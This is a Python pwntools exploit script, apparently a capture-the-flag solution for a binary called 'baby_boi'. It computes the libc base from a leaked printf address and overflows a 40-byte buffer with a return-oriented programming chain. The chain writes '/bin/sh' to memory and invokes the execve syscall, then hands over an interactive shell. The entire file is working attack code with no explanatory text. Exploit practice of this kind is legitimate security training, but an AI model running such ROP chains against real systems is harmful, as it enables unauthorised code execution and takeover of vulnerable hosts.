#!/usr/bin/env python3
from pwn import *

POP_RAX_GADGET = 0x00000000000439c8
POP_RDI_GADGET = 0x000000000002155f
POP_RSI_GADGET = 0x0000000000023e6a
POP_RDX_GADGET = 0x0000000000001b96
MOV_RDX_INTO_ADDR_RAX = 0x00000000000301a4
SYSCALL_GADGET = 0x00000000000013c0

BUF_SIZE = 40
PROGRAM_NAME = b"/bin/sh\x00"
STRING_ADDRESS = 0x0000000000601500
EXECVE_SYSCALL = 0x3b

context.terminal = ["alacritty", "-e", "bash", "-c"] 
pr = pwnlib.gdb.debug("./baby_boi")
libc = ELF("./libc-2.27.so")

pr.recvuntil(b"am: ")
printfAddress = int(pr.recvline().strip(b"\n"), 16)
offset = printfAddress - libc.symbols["printf"]

print("printfAddress libc: " + hex(libc.symbols["printf"]) + "; relocated: " + hex(printfAddress) + "; offset " + hex(offset))

payload = b"\x00" * BUF_SIZE
payload += p64(POP_RDX_GADGET + offset)
payload += PROGRAM_NAME
payload += p64(POP_RAX_GADGET + offset)
payload += p64(STRING_ADDRESS)
payload += p64(MOV_RDX_INTO_ADDR_RAX + offset)

payload += p64(POP_RAX_GADGET + offset)
payload += p64(EXECVE_SYSCALL)
payload += p64(POP_RDI_GADGET + offset)
payload += p64(STRING_ADDRESS)
payload += p64(POP_RSI_GADGET + offset)
payload += p64(0x00)
payload += p64(POP_RDX_GADGET + offset)
payload += p64(0x00)
payload += p64(SYSCALL_GADGET + offset)

pr.send(payload)
pr.interactive()